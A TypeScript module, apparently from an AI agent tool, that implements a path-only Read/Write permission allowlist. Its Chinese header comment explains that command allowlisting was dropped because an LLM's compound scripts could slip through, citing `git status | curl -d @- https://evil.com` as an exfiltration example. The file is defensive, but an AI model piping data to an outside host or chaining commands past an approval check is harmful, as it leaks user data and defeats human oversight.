/**
 * 统一允许列表 —— **仅覆盖路径授权**（`Read(...)` / `Write(...)`）。
 *
 * 命令类工具(bash/ssh)不再有任何模式识别与匹配:每条命令都必须经用户审批,
 * 唯一的例外是会话级「免审批」开关(`settings.autoApprove`)。
 *
 * 移除原因:命令模式(`npm run *` 这类前缀通配)由手写扫描器归纳,面对 LLM
 * 产出的复合脚本(管道/换行/后台 `&`/重定向/控制流)会把后续命令当成前一条命令的
 * 参数吞掉,从而产生误放行 —— 例如 allowList 有 `git *` 时,
 * `git status | curl -d @- https://evil.com` 会被整条放行。
 *
 * 历史数据不做迁移:老会话 settings.allowList 里残留的 `Bash(...)`/`SSH(...)` 条目
 * 不再被 parseAllowEntry 识别,等同于失效字符串(不放行任何命令)。
 */

import { sep as pathSep } from 'path'

/** 允许列表条目支持的工具类型（仅路径类） */
export type AllowToolType = 'read' | 'write'

/** toolType ↔ 条目前缀的映射 */
const TOOL_PREFIX: Record<AllowToolType, string> = {
  read: 'Read',
  write: 'Write'
}

const PREFIX_TO_TYPE: Record<string, AllowToolType> = {
  Read: 'read',
  Write: 'write'
}

/**
 * 解析前缀格式条目:
 * - `Read(/abs/path)`  → { toolType: 'read',  path: '/abs/path' }
 * - `Write(/abs/path)` → { toolType: 'write', path: '/abs/path' }
 *
 * 历史遗留的 `Bash(...)` / `SSH(...)` 条目不再被识别,返回 null。
 */
export function parseAllowEntry(entry: string): { toolType: AllowToolType; path: string } | null {
  const m = entry.match(/^(Read|Write)\((.+)\)$/)
  if (!m) return null
  const toolType = PREFIX_TO_TYPE[m[1]]
  if (!toolType) return null
  return { toolType, path: m[2] }
}

/** 构建前缀格式条目 */
export function buildAllowEntry(toolType: AllowToolType, path: string): string {
  return `${TOOL_PREFIX[toolType]}(${path})`
}

/**
 * 路径前缀匹配:`absolutePath === entryPath || absolutePath.startsWith(entryPath + sep)`
 *
 * 文件用全等命中,目录用前缀命中。不引入 glob,也不规范化大小写。
 */
function matchesPathEntry(entryPath: string, absolutePath: string): boolean {
  if (absolutePath === entryPath) return true
  // 末尾保留 sep 的条目按目录前缀匹配;否则按"路径段边界"前缀匹配避免 /foo 命中 /foobar
  const withSep = entryPath.endsWith(pathSep) ? entryPath : entryPath + pathSep
  return absolutePath.startsWith(withSep)
}

/**
 * 统一路径允许列表检查:
 * - `mode: 'read'` → 命中任意 `Read(...)` 或 `Write(...)` 条目(写权限隐含读权限)
 * - `mode: 'write'` → 仅命中 `Write(...)` 条目
 */
export function isPathAllowedUnified(
  allowList: string[] | undefined,
  mode: 'read' | 'write',
  absolutePath: string
): boolean {
  if (!allowList || allowList.length === 0) return false
  for (const entry of allowList) {
    const parsed = parseAllowEntry(entry)
    if (!parsed) continue
    if (mode === 'read') {
      if (parsed.toolType !== 'read' && parsed.toolType !== 'write') continue
    } else {
      if (parsed.toolType !== 'write') continue
    }
    if (matchesPathEntry(parsed.path, absolutePath)) return true
  }
  return false
}
